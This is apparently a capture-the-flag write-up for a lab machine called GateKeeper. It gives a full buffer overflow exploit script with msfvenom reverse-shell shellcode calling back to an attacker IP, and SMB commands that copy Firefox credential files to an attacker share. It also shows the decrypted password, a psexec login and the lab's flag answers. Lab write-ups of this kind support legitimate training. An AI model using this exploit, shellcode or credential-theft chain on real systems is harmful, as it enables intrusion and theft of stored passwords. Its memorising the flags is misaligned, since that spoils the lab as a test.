# GateKeeper

- MachineIP: `10.10.128.185`
- OS	   : `Windows`
- Exploits : `Buffer Overflow, Stroed Creds`

---

- Nmap recon, port 135`(msrpc)`, 139`(netbios)`, 445`(samba)` ,3389`(ms-wbt-server)` ,31337`(Elite)`
- User share from SMB is accessable

```bash
➜  gatekeeper git:(main) ✗ crackmapexec smb 10.10.128.185 -u 'anonymous' -p 'a' --shares
```

- Accessing the share and downloading its contents

```bash
➜  gatekeeper git:(main) ✗ smbclient -U 'anonymous' //10.10.128.185/Users                                                                        
Enter WORKGROUP\anonymous's password:                                                                                                            
Try "help" to get a list of possible commands.                                                                                                   
smb: \> ls                                                                                                                                       
  .                                  DR        0  Fri May 15 07:27:08 2020                                                                       
  ..                                 DR        0  Fri May 15 07:27:08 2020                                                                       
  Default                           DHR        0  Tue Jul 14 12:37:31 2009                                                                       
  desktop.ini                       AHS      174  Tue Jul 14 10:24:24 2009                                                                       
  Share                               D        0  Fri May 15 07:28:07 2020                                                                       
cd                                                                                                                                               
                7863807 blocks of size 4096. 3865187 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Fri May 15 07:28:07 2020
  ..                                  D        0  Fri May 15 07:28:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 10:57:17 2020

                7863807 blocks of size 4096. 3865187 blocks available
smb: \Share\> get gatekeeper.exe
```

- Now load the appliaction in immunity debugger, crash the applicaiton with bunch of charaters

```python
import socket, sys

host = "127.0.0.1"
port = 31337
payload = "a"*100
timeout = 2

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((host, port))
			print(f"Sending {len(payload)} bytes to the application....")
			s.send(bytes(payload + "\r\n", 'latin-1'))
			s.recv(1024)
	except:
		print(f"Application crashed at {len(payload)} bytes.")
		sys.exit(0)
	payload += "a"*100
```

- Now running the application crashes the appliacition in 200 bytes
- Lets generate a cyclic pattern to find the offset of the applicaition

```bash
# generating cyclic pattern
➜  gatekeeper git:(main) ✗ pwn cyclic 400
```

- Now update the script and run the script

```python
#!/usr/bin/env python

host = "127.0.0.1"
port = 31337

offset = 0
overflow = "a"*offset
retn = ""
padding = ""
payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad"

s_buff = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(bytes(s_buff + "\r\n", 'latin-1'))
s.recv(1024)
print("Application crashed :)")
```

- Now take the value of the `EIP` shown in the Immunity debugger and find the offset of the application

```bash
➜  gatekeeper git:(main) ✗ pwn cyclic -l 0x616D6261
146
```

- Now upadate the offset value in the script and clear the payload value, set the retn value to `bbbb`
- Now on running the script, the application will crash and the EIP will be overwritten with `62626262`
- Now generate hexadecimal charters from `\x00` to `\xff` and update the contents in the payload field
- Now run the script and crash the application (again), now find the bad characters with mona
- The badcharacters in this application are `\x00\x0a`, now generate a shell code with msfconsole without these two specified characters and update the payload value

```bash
➜  gatekeeper git:(main) ✗ msfvenom -p windows/shell_reverse_tcp LHOST=10.14.10.221 LPORT=1337 -f py -v payload -b "\x00\x0a"
```
- Now find an instruction which says `JMP ESP` and upadate the retn value
- Run the script while listening on the port 13337

```bash
#!/usr/bin/env python3

import socket, sys

host = "10.10.128.185"
port = 31337

offset = 146
overflow = "a"*offset
retn = "\xc3\x14\x04\x08" # 080414C3   ? FFE4           JMP ESP
padding = "\x90"*16

# msfvenom -p windows/shell_reverse_tcp LHOST=10.14.10.227 LPORT=1337 EXITFUNC=thread -b "\x00\x0a" -v payload -f py
payload =  ""
payload += "\xbd\x05\x25\xb3\x71\xdb\xcd\xd9\x74\x24\xf4\x5b"                                                                                   
payload += "\x29\xc9\xb1\x52\x83\xc3\x04\x31\x6b\x0e\x03\x6e"                                                                                   
payload += "\x2b\x51\x84\x8c\xdb\x17\x67\x6c\x1c\x78\xe1\x89"                                                                                   
payload += "\x2d\xb8\x95\xda\x1e\x08\xdd\x8e\x92\xe3\xb3\x3a"
payload += "\x20\x81\x1b\x4d\x81\x2c\x7a\x60\x12\x1c\xbe\xe3"
payload += "\x90\x5f\x93\xc3\xa9\xaf\xe6\x02\xed\xd2\x0b\x56"
payload += "\xa6\x99\xbe\x46\xc3\xd4\x02\xed\x9f\xf9\x02\x12"
payload += "\x57\xfb\x23\x85\xe3\xa2\xe3\x24\x27\xdf\xad\x3e"
payload += "\x24\xda\x64\xb5\x9e\x90\x76\x1f\xef\x59\xd4\x5e"
payload += "\xdf\xab\x24\xa7\xd8\x53\x53\xd1\x1a\xe9\x64\x26"
payload += "\x60\x35\xe0\xbc\xc2\xbe\x52\x18\xf2\x13\x04\xeb"
payload += "\xf8\xd8\x42\xb3\x1c\xde\x87\xc8\x19\x6b\x26\x1e"
payload += "\xa8\x2f\x0d\xba\xf0\xf4\x2c\x9b\x5c\x5a\x50\xfb"
payload += "\x3e\x03\xf4\x70\xd2\x50\x85\xdb\xbb\x95\xa4\xe3"
payload += "\x3b\xb2\xbf\x90\x09\x1d\x14\x3e\x22\xd6\xb2\xb9"
payload += "\x45\xcd\x03\x55\xb8\xee\x73\x7c\x7f\xba\x23\x16"
payload += "\x56\xc3\xaf\xe6\x57\x16\x7f\xb6\xf7\xc9\xc0\x66"
payload += "\xb8\xb9\xa8\x6c\x37\xe5\xc9\x8f\x9d\x8e\x60\x6a"
payload += "\x76\xbb\x7a\x7e\x65\xd3\x80\x7e\x6c\x1d\x0c\x98"
payload += "\x04\x4d\x58\x33\xb1\xf4\xc1\xcf\x20\xf8\xdf\xaa"
payload += "\x63\x72\xec\x4b\x2d\x73\x99\x5f\xda\x73\xd4\x3d"
payload += "\x4d\x8b\xc2\x29\x11\x1e\x89\xa9\x5c\x03\x06\xfe"
payload += "\x09\xf5\x5f\x6a\xa4\xac\xc9\x88\x35\x28\x31\x08"
payload += "\xe2\x89\xbc\x91\x67\xb5\x9a\x81\xb1\x36\xa7\xf5"
payload += "\x6d\x61\x71\xa3\xcb\xdb\x33\x1d\x82\xb0\x9d\xc9"
payload += "\x53\xfb\x1d\x8f\x5b\xd6\xeb\x6f\xed\x8f\xad\x90"
payload += "\xc2\x47\x3a\xe9\x3e\xf8\xc5\x20\xfb\x18\x24\xe0"
payload += "\xf6\xb0\xf1\x61\xbb\xdc\x01\x5c\xf8\xd8\x81\x54"
payload += "\x81\x1e\x99\x1d\x84\x5b\x1d\xce\xf4\xf4\xc8\xf0"
payload += "\xab\xf5\xd8"


# bad chars \x00\x0a

s_buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(bytes(s_buffer + "\r\n", 'latin-1'))
s.recv(1024)
print("Crashed :)")
```

- Now the reverse shell will be obtained as `natbat` and the user.txt can be enumerated
- On the desktop we can see `Firefox.lnk` which is a shortcut for firefox application 
- Firefox is likely to be installed on the computer
- Roaming around we can obtain the version of firefox which is 75, has a memory leak vulnerablity which we can make use of to obtain password which are stored in the browser
- Following [this](https://github.com/lclevy/firepwd) exploit, we can obtain the stored password
- Requirements, `keys3/4.db` and `logins.json`
- We transfer both to the machine

```bash
# on the attacker machin
➜  gatekeeper git:(main) ✗ sudo smbserver.py share . -smb2support

# on the victim machine

# mounting the share
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>net use x: \\10.14.10.227\share
net use x: \\10.14.10.227\share
The command completed successfully.

# copying files 
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>copy logins.json x:
copy logins.json x:
        1 file(s) copied.

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>copy key4.db x:
copy key4.db x:
        1 file(s) copied.
```

- Now copy these files to the firepwd directory and run it

```bash
➜  firepwd git:(master) ✗ python3 firepwd.py
[..snip..]
decrypting login/password pairs
   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
```

- Now we got the password for the mayor lets login to the machine

```bash
➜  ~ psexec.py -target-ip 10.10.128.185 10.10.128.185/mayor:8CL7O1N78MdrCIsV@10.10.128.185 cmd
[..snip..]
C:\Users\mayor\Desktop>type root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}
```

### Answers

#### Defeat the Gatekeeper and pass through the fire.

- Locate and find the User Flag.
`{H4lf_W4y_Th3r3}`

- Locate and find the Root Flag
`{Th3_M4y0r_C0ngr4tul4t3s_U}`
